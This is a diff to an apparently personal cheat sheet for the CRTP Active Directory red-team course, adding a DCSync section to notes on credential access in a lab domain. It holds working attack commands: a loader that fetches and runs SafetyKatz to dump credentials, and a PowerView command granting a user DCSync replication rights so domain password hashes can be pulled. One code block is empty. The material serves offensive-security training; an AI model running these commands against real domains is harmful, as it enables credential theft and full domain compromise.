@@ -29,6 +29,7 @@ Command/tooling reference material useful for the CRTP course and Active Directo
      - [Constrained Delegation](#Constrained-Delegation)
    - [Credential Access](#Credential-Access)
      - [Mimikatz](#Mimikatz)
+     - [DCSync](#DCSync]
    - [Lateral Movement](#Lateral-Movement)
    - [Other Tooling](#Tooling)
       - [Bloodhound](#Bloodhound)
@@ -350,6 +351,15 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 lsadump::lsa /patch
 #or in one command
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+###DCSync
+This method targets a DC, requests directory replication, and collects password hashes from the subsequent response.
+#### Validate Replication Rights 
+```powershell
+```
+#### Add replication rights to user
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student525 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 ## Lateral Movement
 All the PS remoting 
